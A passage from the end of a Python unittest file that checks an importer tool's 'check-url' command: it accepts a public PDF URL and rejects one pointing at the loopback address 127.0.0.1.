            with mock.patch("sys.argv", ["importer", "check-url", "https://example.com/prog.pdf"]):
                with self.assertRaises(SystemExit) as ctx:
                    importer_cli_main()
                self.assertEqual(ctx.exception.code, 0)

    def test_cli_check_url_blocked(self) -> None:
        with mock.patch("sys.argv", ["importer", "check-url", "https://127.0.0.1/prog.pdf"]):
            with self.assertRaises(SystemExit) as ctx:
                importer_cli_main()
            self.assertEqual(ctx.exception.code, 1)


if __name__ == "__main__":
    unittest.main()
